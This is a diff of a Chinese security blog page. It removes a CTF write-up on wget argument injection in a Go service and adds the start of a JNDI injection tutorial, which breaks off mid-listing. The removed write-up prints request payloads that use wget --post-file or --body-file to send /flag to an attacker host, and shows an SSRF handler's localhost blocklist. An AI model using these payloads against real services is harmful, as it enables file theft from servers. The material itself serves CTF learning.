@@ -4,13 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="陇原战役复现, Ethe&#39;s blog">
-    <meta name="description" content="好久之前就想复现这个了，一直拖到了现在
-CheckIN下载附件后里面是个go文件
-但是实际上这个题跟go关系不大
-
-func getController(c *gin.Context) &amp;#123;
-    cmd :&amp;#x3D; exec">
+    <meta name="keywords" content="JNDI注入, Ethe&#39;s blog">
+    <meta name="description" content="终于学到JNDI了，其实最开始的时候我是在学fastjson的，然后发现fastjson要用JNDI，所以又想去学JNDI，但是JNDI里又用了很多RMI的内容，所以只好花了几天把之前看了个开头的RMI重新看了一遍。
+JNDI概述JNDI(">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +18,7 @@ func getController(c *gin.Context) &amp;#123;
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>陇原战役复现 | Ethe&#39;s blog</title>
+    <title>JNDI注入 | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -326,12 +322,12 @@ func getController(c *gin.Context) &amp;#123;
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">陇原战役复现</h1>
+                    <h1 class="description center-align post-title">JNDI注入</h1>
                 </div>
             </div>
         </div>
@@ -461,8 +457,12 @@ func getController(c *gin.Context) &amp;#123;
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ctf/">
-                                <span class="chip bg-color">ctf</span>
+                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">web学习</span>
+                            </a>
+                        
+                            <a href="/tags/Java/">
+                                <span class="chip bg-color">Java</span>
                             </a>
                         
                     </div>
@@ -477,28 +477,28 @@ func getController(c *gin.Context) &amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-05-12
+                    2023-05-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-27
+                    2023-05-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.6k
+                    4.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    21 分
+                    20 分
                 </div>
                 
 
@@ -521,996 +521,456 @@ func getController(c *gin.Context) &amp;#123;
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>好久之前就想复现这个了，一直拖到了现在</p>
-<h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>下载附件后里面是个go文件</p>
-<p>但是实际上这个题跟go关系不大</p>
-<pre class="language-go" data-language="go"><code class="language-go">
-func getController(c *gin.Context) &#123;
-    cmd :&#x3D; exec.Command(&quot;&#x2F;bin&#x2F;wget&quot;, c.QueryArray(&quot;argv&quot;)[1:]...)&#x2F;&#x2F;这里的QueryArray是gin框架中接收一组请求的方法。因此在传参的过程中，数组内元素个数没有限制，只需要知道数组内的元素会拼接到一起跟在wget后面执行即可。
-    err :&#x3D; cmd.Run()
-    if err !&#x3D; nil &#123;
-        fmt.Println(&quot;error: &quot;, err)
-    &#125;
-    
-    c.String(http.StatusOK, &quot;Nothing&quot;)
-&#125;
+                <p>终于学到JNDI了，其实最开始的时候我是在学fastjson的，然后发现fastjson要用JNDI，所以又想去学JNDI，但是JNDI里又用了很多RMI的内容，所以只好花了几天把之前看了个开头的RMI重新看了一遍。</p>
+<h1 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h1><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)是为Java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如RMI、CORBA、LDAP、DNS等。<br>其中Naming Service类似于哈希表的K/V对，通过名称去获取对应的服务。Directory Service是一种特殊的Naming Service，用类似目录的方式来存取服务。</p>
+<p>这些命名/目录服务提供者有</p>
+<ul>
+<li>RMI（JAVA远程方法调用）</li>
+<li>LDAP（轻量级目录访问协议）</li>
+<li>CORBA（公共对象请求代理体系结构）</li>
+<li>DNS（域名服务）</li>
+</ul>
+<p>在JNDI注入的过程中我们常用的就是RMI和LDAP</p>
+<p>（下面这个表是抄的，不太确定，感觉在JDK8的时候最起码应该是8u121吧</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>JDK6</th>
+<th>JDK7</th>
+<th>JDK8</th>
+<th>JDK11</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RMI可用</td>
+<td>6u132以下</td>
+<td>7u122以下</td>
+<td>8u113以下</td>
+<td>无</td>
+</tr>
+<tr>
+<td>LDAP可用</td>
+<td>6u211以下</td>
+<td>7u201以下</td>
+<td>8u191以下</td>
+<td>11.0.1以下</td>
+</tr>
+</tbody></table>
+<h2 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h2><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
+<pre class="language-none"><code class="language-none">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；
 
+javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；
 
-    router.GET(&quot;&#x2F;wget&quot;, getController)</code></pre>
+javax.naming.event：在命名目录服务器中请求事件通知；
 
-<p>可以看到/wget路由下有个getController</p>
-<p>我们先了解一下wget</p>
-<p>wget命令是Linux系统用于从Web下载文件的命令行工具，支持 HTTP、HTTPS及FTP协议下载文件，而且wget还提供了很多选项，例如下载多个文件、后台下载，使用代理等等</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.dn.net/skdkjzz/article/details/39103947">嵌入式 Wget使用一点方法_skdkjzz的博客-CSDN博客</a></p>
-<p><strong>post请求</strong></p>
-<p>Wget默认发送Get请求，通过指定参数--post-dataor --post-file 这两个选项</p>
-<p>e.g wget--post-data &quot;aaaa&quot; <a target="_blank" rel="noopener" href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p>
-<p>​     wget--post-data &quot;user=foo&quot; <a target="_blank" rel="noopener" href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p>
-<p>​     wget–post-file post_file <a target="_blank" rel="noopener" href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p>
-<p><strong>head请求</strong></p>
-<p>wget --debug--spider <a target="_blank" rel="noopener" href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p>
-<p>​     --spider并不下载文件，通过head请求服务器，获取web服务器响应</p>
-<p><strong>–no-cache禁用缓存</strong></p>
-<p>e.g  wget–no-cache <a target="_blank" rel="noopener" href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p>
-<p>​     请求数据包头部Pragma :no-cache，不使用缓存，http1.1加上Cache-Control: no-cache, must-revalidate</p>
-<p><strong>–referer使用referer</strong></p>
-<p>Referrer主要用户点击的上一个页面，一般可以用做防盗链技术，防盗链可以在url后面加一个key=value加密字段，或者使用特定referer字段。</p>
-<p>e.g  wget–debug –referer <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p>
-<p><strong>显示wget帮助和版本信息</strong></p>
-<p>Wget –v or wget –h</p>
-<p><strong>–e 就是执行命令</strong></p>
-<p>e.g wget-e &quot;postdata=111111111&quot; <a target="_blank" rel="noopener" href="http://localhost:8333/test.php">http://localhost:8333/test.php</a></p>
-<p>这种形式和wget –post-data=”11111111” <a target="_blank" rel="noopener" href="http://localhost:8333/test.php%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%E3%80%82">http://localhost:8333/test.php是相同的。</a></p>
-<p><strong>logfile (-o)把debug信息输出到文件</strong></p>
-<p>wget <a target="_blank" rel="noopener" href="http://localhost:8333/test.php">http://localhost:8333/test.php</a> -ologfile</p>
-<p><strong>referer设置</strong></p>
-<p>wget --debug --referer &quot;<a target="_blank" rel="noopener" href="http://www.baidu.com/dsadsa&quot;">www.baidu.com/dsadsa&quot;</a> <a target="_blank" rel="noopener" href="http://www.baidu.com/index.html">www.baidu.com/index.html</a></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cfbd9ca006b1">wget - 简书 (jianshu.com)</a></p>
-<p>用法： wget [选项]... [URL]...</p>
-<p>长选项所必须的参数在使用短选项时也是必须的。</p>
-<p><strong>启动：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-V, --version</td>
-<td>显示 Wget 的版本信息并退出。</td>
-</tr>
-<tr>
-<td>-h, --help</td>
-<td>打印此帮助。</td>
-</tr>
-<tr>
-<td>-b, --background</td>
-<td>启动后转入后台。</td>
-</tr>
-<tr>
-<td>-e, --execute=COMMAND</td>
-<td>运行一个“.wgetrc”风格的命令。</td>
-</tr>
-</tbody></table>
-<p><strong>日志和输入文件：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-o, --output-file=FILE</td>
-<td>将日志信息写入 FILE。</td>
-</tr>
-<tr>
-<td>-a, --append-output=FILE</td>
-<td>将信息添加至 FILE。</td>
-</tr>
-<tr>
-<td>-d, --debug</td>
-<td>打印大量调试信息。</td>
-</tr>
-<tr>
-<td>-q, --quiet</td>
-<td>安静模式 (无信息输出)。</td>
-</tr>
-<tr>
-<td>-v, --verbose</td>
-<td>详尽的输出 (此为默认值)。</td>
-</tr>
-<tr>
-<td>-nv, --no-verbose</td>
-<td>关闭详尽输出，但不进入安静模式。</td>
-</tr>
-<tr>
-<td>--report-speed=TYPE</td>
-<td>Output bandwidth as TYPE. TYPE can be bits.</td>
-</tr>
-<tr>
-<td>-i, --input-file=FILE</td>
-<td>下载本地或外部 FILE 中的 URLs。</td>
-</tr>
-<tr>
-<td>-F, --force-html</td>
-<td>把输入文件当成 HTML 文件。</td>
-</tr>
-<tr>
-<td>-B, --base=URL</td>
-<td>解析与 URL 相关的HTML 输入文件 (由 -i -F 选项指定)。</td>
-</tr>
-<tr>
-<td>--config=FILE</td>
-<td>Specify config file to use.</td>
-</tr>
-</tbody></table>
-<p><strong>下载：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-t, --tries=NUMBER</td>
-<td>设置重试次数为 NUMBER (0 代表无限制)。</td>
-</tr>
-<tr>
-<td>--retry-connrefused</td>
-<td>即使拒绝连接也是重试。</td>
-</tr>
-<tr>
-<td>-O, --output-document=FILE</td>
-<td>将文档写入 FILE。</td>
-</tr>
-<tr>
-<td>-nc, --no-clobber</td>
-<td>skip downloads that would download to existing files (overwriting them).</td>
-</tr>
-<tr>
-<td>-c, --continue</td>
-<td>断点续传下载文件。</td>
-</tr>
-<tr>
-<td>--progress=TYPE</td>
-<td>选择进度条类型。</td>
-</tr>
-<tr>
-<td>-N, --timestamping</td>
-<td>只获取比本地文件新的文件。</td>
-</tr>
-<tr>
-<td>--no-use-server-timestamps</td>
-<td>不用服务器上的时间戳来设置本地文件。</td>
-</tr>
-<tr>
-<td>-S, --server-response</td>
-<td>打印服务器响应。</td>
-</tr>
-<tr>
-<td>--spider</td>
-<td>不下载任何文件。</td>
-</tr>
-<tr>
-<td>-T, --timeout=SECONDS</td>
-<td>将所有超时设为 SECONDS 秒。</td>
-</tr>
-<tr>
-<td>--dns-timeout=SECS</td>
-<td>设置 DNS 查寻超时为 SECS 秒。</td>
-</tr>
-<tr>
-<td>--connect-timeout=SECS</td>
-<td>设置连接超时为 SECS 秒。</td>
-</tr>
-<tr>
-<td>--read-timeout=SECS</td>
-<td>设置读取超时为 SECS 秒。</td>
-</tr>
-<tr>
-<td>-w, --wait=SECONDS</td>
-<td>等待间隔为 SECONDS 秒。</td>
-</tr>
-<tr>
-<td>--waitretry=SECONDS</td>
-<td>在获取文件的重试期间等待 1..SECONDS 秒。</td>
-</tr>
-<tr>
-<td>--random-wait</td>
-<td>获取多个文件时，每次随机等待间隔0.5<em>WAIT...1.5</em>WAIT 秒。</td>
-</tr>
-<tr>
-<td>--no-proxy</td>
-<td>禁止使用代理。</td>
-</tr>
-<tr>
-<td>-Q, --quota=NUMBER</td>
-<td>设置获取配额为 NUMBER 字节。</td>
-</tr>
-<tr>
-<td>--bind-address=ADDRESS</td>
-<td>绑定至本地主机上的 ADDRESS (主机名或是 IP)。</td>
-</tr>
-<tr>
-<td>--limit-rate=RATE</td>
-<td>限制下载速率为 RATE。</td>
-</tr>
-<tr>
-<td>--no-dns-cache</td>
-<td>关闭 DNS 查寻缓存。</td>
-</tr>
-<tr>
-<td>--restrict-file-names=OS</td>
-<td>限定文件名中的字符为 OS 允许的字符。</td>
-</tr>
-<tr>
-<td>--ignore-case</td>
-<td>匹配文件/目录时忽略大小写。</td>
-</tr>
-<tr>
-<td>-4, --inet4-only</td>
-<td>仅连接至 IPv4 地址。</td>
-</tr>
-<tr>
-<td>-6, --inet6-only</td>
-<td>仅连接至 IPv6 地址。</td>
-</tr>
-<tr>
-<td>--prefer-family=FAMILY</td>
-<td>首先连接至指定协议的地址FAMILY 为 IPv6，IPv4 或是 none。</td>
-</tr>
-<tr>
-<td>--user=USER</td>
-<td>将 ftp 和 http 的用户名均设置为 USER。</td>
-</tr>
-<tr>
-<td>--password=PASS</td>
-<td>将 ftp 和 http 的密码均设置为 PASS。</td>
-</tr>
-<tr>
-<td>--ask-password</td>
-<td>提示输入密码。</td>
-</tr>
-<tr>
-<td>--no-iri</td>
-<td>关闭 IRI 支持。</td>
-</tr>
-<tr>
-<td>--local-encoding=ENC</td>
-<td>IRI (国际化资源标识符) 使用 ENC 作为本地编码。</td>
-</tr>
-<tr>
-<td>--remote-encoding=ENC</td>
-<td>使用 ENC 作为默认远程编码。</td>
-</tr>
-<tr>
-<td>--unlink</td>
-<td>remove file before clobber.</td>
-</tr>
-</tbody></table>
-<p><strong>目录：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-nd, --no-directories</td>
-<td>不创建目录。</td>
-</tr>
-<tr>
-<td>-x, --force-directories</td>
-<td>强制创建目录。</td>
-</tr>
-<tr>
-<td>-nH, --no-host-directories</td>
-<td>不要创建主目录。</td>
-</tr>
-<tr>
-<td>--protocol-directories</td>
-<td>在目录中使用协议名称。</td>
-</tr>
-<tr>
-<td>-P, --directory-prefix=PREFIX</td>
-<td>以 PREFIX/... 保存文件</td>
-</tr>
-<tr>
-<td>--cut-dirs=NUMBER</td>
-<td>忽略远程目录中 NUMBER 个目录层。</td>
-</tr>
-</tbody></table>
-<p><strong>HTTP 选项：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>--http-user=USER</td>
-<td>设置 http 用户名为 USER。</td>
-</tr>
-<tr>
-<td>--http-password=PASS</td>
-<td>设置 http 密码为 PASS。</td>
-</tr>
-<tr>
-<td>--no-cache</td>
-<td>不在服务器上缓存数据。</td>
-</tr>
-<tr>
-<td>--default-page=NAME</td>
-<td>改变默认页(默认页通常是“index.html”)。</td>
-</tr>
-<tr>
-<td>-E, --adjust-extension</td>
-<td>以合适的扩展名保存 HTML/CSS 文档。</td>
-</tr>
-<tr>
-<td>--ignore-length</td>
-<td>忽略头部的‘Content-Length’区域。</td>
-</tr>
-<tr>
-<td>--header=STRING</td>
-<td>在头部插入 STRING。</td>
-</tr>
-<tr>
-<td>--max-redirect</td>
-<td>每页所允许的最大重定向。</td>
-</tr>
-<tr>
-<td>--proxy-user=USER</td>
-<td>使用 USER 作为代理用户名。</td>
-</tr>
-<tr>
-<td>--proxy-password=PASS</td>
-<td>使用 PASS 作为代理密码。</td>
-</tr>
-<tr>
-<td>--referer=URL</td>
-<td>在 HTTP 请求头包含‘Referer: URL’。</td>
-</tr>
-<tr>
-<td>--save-headers</td>
-<td>将 HTTP 头保存至文件。</td>
-</tr>
-<tr>
-<td>-U, --user-agent=AGENT</td>
-<td>标识为 AGENT 而不是 Wget/VERSION。</td>
-</tr>
-<tr>
-<td>--no-http-keep-alive</td>
-<td>禁用 HTTP keep-alive (永久连接)。</td>
-</tr>
-<tr>
-<td>--no-cookies</td>
-<td>不使用 cookies。</td>
-</tr>
-<tr>
-<td>--load-cookies=FILE</td>
-<td>会话开始前从 FILE 中载入 cookies。</td>
-</tr>
-<tr>
-<td>--save-cookies=FILE</td>
-<td>会话结束后保存 cookies 至 FILE。</td>
-</tr>
-<tr>
-<td>--keep-session-cookies</td>
-<td>载入并保存会话 (非永久) cookies。</td>
-</tr>
-<tr>
-<td>--post-data=STRING</td>
-<td>使用 POST 方式；把 STRING 作为数据发送。</td>
-</tr>
-<tr>
-<td>--post-file=FILE</td>
-<td>使用 POST 方式；发送 FILE 内容。</td>
-</tr>
-<tr>
-<td>--method=HTTPMethod</td>
-<td>use method &quot;HTTPMethod&quot; in the header.</td>
-</tr>
-<tr>
-<td>--body-data=STRING</td>
-<td>Send STRING as data. --method MUST be set.</td>
-</tr>
-<tr>
-<td>--body-file=FILE</td>
-<td>Send contents of FILE. --method MUST be set.</td>
-</tr>
-<tr>
-<td>--content-disposition</td>
-<td>当选中本地文件名时允许 Content-Disposition 头部 (尚在实验)。</td>
-</tr>
-<tr>
-<td>--content-on-error</td>
-<td>output the received content on server errors.</td>
-</tr>
-<tr>
-<td>--auth-no-challenge</td>
-<td>发送不含服务器询问的首次等待的基本 HTTP 验证信息。</td>
-</tr>
-</tbody></table>
-<p><strong>HTTPS (SSL/TLS) 选项：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>--secure-protocol=PR</td>
-<td>choose secure protocol, one of auto, SSLv2,SSLv3, TLSv1 and PFS.</td>
-</tr>
-<tr>
-<td>--https-only</td>
-<td>only follow secure HTTPS links</td>
-</tr>
-<tr>
-<td>--no-check-certificate</td>
-<td>不要验证服务器的证书。</td>
-</tr>
-<tr>
-<td>--certificate=FILE</td>
-<td>客户端证书文件。</td>
-</tr>
-<tr>
-<td>--certificate-type=TYPE</td>
-<td>客户端证书类型，PEM 或 DER。</td>
-</tr>
-<tr>
-<td>--private-key=FILE</td>
-<td>私钥文件。</td>
-</tr>
-<tr>
-<td>--private-key-type=TYPE</td>
-<td>私钥文件类型，PEM 或 DER。</td>
-</tr>
-<tr>
-<td>--ca-certificate=FILE</td>
-<td>带有一组 CA 认证的文件。</td>
-</tr>
-<tr>
-<td>--ca-directory=DIR</td>
-<td>保存 CA 认证的哈希列表的目录。</td>
-</tr>
-<tr>
-<td>--random-file=FILE</td>
-<td>带有生成 SSL PRNG 的随机数据的文件。</td>
-</tr>
-<tr>
-<td>--egd-file=FILE</td>
-<td>用于命名带有随机数据的 EGD 套接字的文件。</td>
-</tr>
-</tbody></table>
-<p><strong>FTP 选项：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>--ftp-user=USER</td>
-<td>设置 ftp 用户名为 USER。</td>
-</tr>
-<tr>
-<td>--ftp-password=PASS</td>
-<td>设置 ftp 密码为 PASS。</td>
-</tr>
-<tr>
-<td>--no-remove-listing</td>
-<td>不要删除‘.listing’文件。</td>
-</tr>
-<tr>
-<td>--no-glob</td>
-<td>不在 FTP 文件名中使用通配符展开。</td>
-</tr>
-<tr>
-<td>--no-passive-ftp</td>
-<td>禁用“passive”传输模式。</td>
-</tr>
-<tr>
-<td>--preserve-permissions</td>
-<td>保留远程文件的权限。</td>
-</tr>
-<tr>
-<td>--retr-symlinks</td>
-<td>递归目录时，获取链接的文件 (而非目录)。</td>
-</tr>
-</tbody></table>
-<p><strong>WARC 选项：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>--warc-file=FILENAME</td>
-<td>save request/response data to a .warc.gz file.</td>
-</tr>
-<tr>
-<td>--warc-header=STRING</td>
-<td>insert STRING into the warcinfo record.</td>
-</tr>
-<tr>
-<td>--warc-max-size=NUMBER</td>
-<td>set maximum size of WARC files to NUMBER.</td>
-</tr>
-<tr>
-<td>--warc-cdx</td>
-<td>write CDX index files.</td>
-</tr>
-<tr>
-<td>--warc-dedup=FILENAME</td>
-<td>do not store records listed in this CDX file.</td>
-</tr>
-<tr>
-<td>--no-warc-compression</td>
-<td>do not compress WARC files with GZIP.</td>
-</tr>
-<tr>
-<td>--no-warc-digests</td>
-<td>do not calculate SHA1 digests.</td>
-</tr>
-<tr>
-<td>--no-warc-keep-log</td>
-<td>do not store the log file in a WARC record.</td>
-</tr>
-<tr>
-<td>--warc-tempdir=DIRECTORY</td>
-<td>location for temporary files created by the WARC writer.</td>
-</tr>
-</tbody></table>
-<p><strong>递归下载：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-r, --recursive</td>
-<td>指定递归下载。</td>
-</tr>
-<tr>
-<td>-l, --level=NUMBER</td>
-<td>最大递归深度 (inf 或 0 代表无限制，即全部下载)。</td>
-</tr>
-<tr>
-<td>--delete-after</td>
-<td>下载完成后删除本地文件。</td>
-</tr>
-<tr>
-<td>-k, --convert-links</td>
-<td>让下载得到的 HTML 或 CSS 中的链接指向本地文件。</td>
-</tr>
-<tr>
-<td>--backups=N</td>
-<td>before writing file X, rotate up to N backup files.</td>
-</tr>
-<tr>
-<td>-K, --backup-converted</td>
-<td>在转换文件 X 前先将它备份为 X.orig。</td>
-</tr>
-<tr>
-<td>-m, --mirror</td>
-<td>-N -r -l inf --no-remove-listing 的缩写形式。</td>
-</tr>
-<tr>
-<td>-p, --page-requisites</td>
-<td>下载所有用于显示 HTML 页面的图片之类的元素。</td>
-</tr>
-<tr>
-<td>--strict-comments</td>
-<td>用严格方式 (SGML) 处理 HTML 注释。</td>
-</tr>
-</tbody></table>
-<p><strong>递归接受/拒绝：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-A, --accept=LIST</td>
-<td>逗号分隔的可接受的扩展名列表。</td>
-</tr>
-<tr>
-<td>-R, --reject=LIST</td>
-<td>逗号分隔的要拒绝的扩展名列表。</td>
-</tr>
-<tr>
-<td>--accept-regex=REGEX</td>
-<td>regex matching accepted URLs.</td>
-</tr>
-<tr>
-<td>--reject-regex=REGEX</td>
-<td>regex matching rejected URLs.</td>
-</tr>
-<tr>
-<td>--regex-type=TYPE</td>
-<td>regex type (posix).</td>
-</tr>
-<tr>
-<td>-D, --domains=LIST</td>
-<td>逗号分隔的可接受的域列表。</td>
-</tr>
-<tr>
-<td>--exclude-domains=LIST</td>
-<td>逗号分隔的要拒绝的域列表。</td>
-</tr>
-<tr>
-<td>--follow-ftp</td>
-<td>跟踪 HTML 文档中的 FTP 链接。</td>
-</tr>
-<tr>
-<td>--follow-tags=LIST</td>
-<td>逗号分隔的跟踪的 HTML 标识列表。</td>
-</tr>
-<tr>
-<td>--ignore-tags=LIST</td>
-<td>逗号分隔的忽略的 HTML 标识列表。</td>
-</tr>
-<tr>
-<td>-H, --span-hosts</td>
-<td>递归时转向外部主机。</td>
-</tr>
-<tr>
-<td>-L, --relative</td>
-<td>只跟踪有关系的链接。</td>
-</tr>
-<tr>
-<td>-I, --include-directories=LIST</td>
-<td>允许目录的列表。</td>
-</tr>
-<tr>
-<td>--trust-server-names</td>
-<td>use the name specified by the redirection url last component.</td>
-</tr>
-<tr>
-<td>-X, --exclude-directories=LIST</td>
-<td>排除目录的列表。</td>
-</tr>
-<tr>
-<td>-np, --no-parent</td>
-<td>不追溯至父目录。</td>
-</tr>
-</tbody></table>
-</blockquote>
-<p>还可以利用wget进行一些命令外带</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39696665/article/details/110465937"> -bash: wget: 未找到命令_利用命令注入外带数据的一些姿势_weixin_39696665的博客-CSDN博客</a></p>
-<h3 id="一-直接使用wget"><a href="#一-直接使用wget" class="headerlink" title="一.直接使用wget"></a>一.直接使用wget</h3><p>这里我们就利用了<code>–post-file</code>实现对flag文件上传到我们自己服务器上的操作<code>wget --post-file /flag http://ip:port</code></p>
-<p>因为根据代码</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512231220147.png" alt="image-20220512231220147"></p>
-<p>可以看到这是从数组第二个开始取，所以第一个是什么都无所谓，我们要构造的payload要从第二个开始</p>
-<p>payload</p>
-<p><code>/wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://ip:port/</code></p>
-<p>在就相当于将/flag里的内容上传到我们服务器的这个端口上，只要我们在服务器上监听这个端口，就能看到上传的内容</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512230723967.png" alt="image-20220512230723967"></p>
-<h3 id="二-使用proxy进行ssrf"><a href="#二-使用proxy进行ssrf" class="headerlink" title="二.使用proxy进行ssrf"></a>二.使用proxy进行ssrf</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512231839155.png" alt="image-20220512231839155"></p>
-<p>在这里我们看到不仅仅是<code>--post-file</code>可以传输文件，<code>--body-file</code>同样可以，只是需要指定method</p>
-<p>所以<code>/wget?argv=2&amp;argv=--body-file&amp;argv=/flag&amp;argv=--method=POST&amp;argv=http://ip:port/</code>同样可以</p>
-<p>当然这个不是我们的ssrf</p>
-<p>ssrf在/proxy路由里</p>
-<pre class="language-go" data-language="go"><code class="language-go">func proxyController(c *gin.Context) &#123;
-    
-    var url Url
-    if err :&#x3D; c.ShouldBindJSON(&amp;url); err !&#x3D; nil &#123;
-        c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;)
-        return
-    &#125;
-    
-    re :&#x3D; regexp.MustCompile(&quot;127.0.0.1|0.0.0.0|06433|0x|0177|localhost|ffff&quot;)
-    if re.MatchString(url.Url) &#123;
-        c.JSON(403, gin.H&#123;&quot;msg&quot;: &quot;Url Forbidden&quot;&#125;)
-        return
-    &#125;
-    
-    client :&#x3D; &amp;http.Client&#123;Timeout: 2 * time.Second&#125;
+javax.naming.ldap：提供LDAP支持；
 
-    resp, err :&#x3D; client.Get(url.Url)
-    if err !&#x3D; nil &#123;
-        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)
-        return
-    &#125;
-    defer resp.Body.Close()
-    var buffer [512]byte
-    result :&#x3D; bytes.NewBuffer(nil)
-    for &#123;
-        n, err :&#x3D; resp.Body.Read(buffer[0:])
-        result.Write(buffer[0:n])
-        if err !&#x3D; nil &amp;&amp; err &#x3D;&#x3D; io.EOF &#123;
+javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</code></pre>
 
-            break
-        &#125; else if err !&#x3D; nil &#123;
-            c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)
-            return
-        &#125;
+<h2 id="JNDI里的类"><a href="#JNDI里的类" class="headerlink" title="JNDI里的类"></a>JNDI里的类</h2><p>写一点jndi要用到的类的作用</p>
+<h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><pre class="language-java" data-language="java"><code class="language-java">InitialContext() 
+构建一个初始上下文。  
+InitialContext(boolean lazy) 
+构造一个初始上下文，并选择不初始化它。  
+InitialContext(Hashtable&lt;?,?&gt; environment) 
+使用提供的环境构建初始上下文。 </code></pre>
+
+<p>代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">InitialContext initialContext &#x3D; new InitialContext();</code></pre>
+
+<p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
+<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><pre class="language-java" data-language="java"><code class="language-java">bind(Name name, Object obj) 
+	将名称绑定到对象。 
+list(String name) 
+	枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
+lookup(String name) 
+	检索命名对象。 
+rebind(String name, Object obj) 
+	将名称绑定到对象，覆盖任何现有绑定。 
+unbind(String name) 
